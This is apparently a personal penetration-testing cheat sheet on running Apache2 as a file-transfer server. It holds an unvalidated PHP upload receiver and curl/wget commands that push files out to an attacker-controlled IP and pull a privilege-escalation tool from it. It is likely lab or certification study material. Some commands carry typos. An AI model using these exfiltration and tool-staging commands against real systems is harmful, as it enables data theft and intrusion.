---
id: tools-apache2
tags: ["kali", "tool", "exfiltration", "secure"]
created: 2023-01-12 11:56
---
# tools-apache2

backlinks: [[]]

sources:

---

- default log path - /var/log/apache2/

```shell
# start the service
sudo systemctrl start apache2

# watch traffic on the apache2 access log
sudo watch -n 5 cat /var/log/apache2/access.log

```





- php script to receive file
  
  ```phpwww
    
    <?php
        //save as upload.php
        //check uploads folder exists and permissions applied
        //  sudo chown www-data: /var/www/uploads

        // restart server 
        //  etc/init.d/apache2 restart

    
    $uploaddir = '/var/www/uploads';

    $uploadfile = $uploaddir . $_FILES['file']['name'];

    move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
    ?>

  ```


  curl script to push
  curl -d @/challenge/try-harder.mp3 http://192.168.119.125:80/upload.php

#get file from folder server
curl -o unix-privesc-check-1.4.tar.gz http://192.168.119.125/unix-privesc-check-1.4.tar.gz    

  wget --no-check-certificate 


  wget -header="Content-type: multipart/form-data boundary=FILEUPLOAD" --post-file clear-rules.sh   http://192.168.119.121/upload.php


  http://192.168.119.121/upload.php